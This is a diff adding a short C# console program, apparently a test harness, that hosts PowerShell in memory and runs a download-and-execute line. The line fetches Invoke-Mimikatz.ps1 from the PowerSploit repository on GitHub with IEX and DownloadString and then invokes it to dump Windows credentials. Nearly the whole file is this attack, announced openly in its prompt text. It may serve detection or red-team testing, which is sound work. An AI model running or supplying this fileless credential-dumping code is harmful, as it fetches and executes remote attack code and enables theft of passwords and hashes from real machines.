@@ -1,0 +1,34 @@
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Management.Automation;
+using System.Collections.ObjectModel;
+
+namespace full_engine_test
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("Press any key to execute Invoke-Mimikatz from memory!");
+            Console.ReadKey();
+            using (PowerShell PowerShellInstance = PowerShell.Create())
+            {
+                PowerShellInstance.AddScript("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz; exit");
+                Collection<PSObject> PSOutput = PowerShellInstance.Invoke();
+
+                foreach (PSObject outputItem in PSOutput)
+                {
+                    if (outputItem != null)
+                    {
+
+                    }
+                }
+            }
+            Console.WriteLine("Press any key to exit");
+            Console.ReadKey();
+        }
+    }
+}
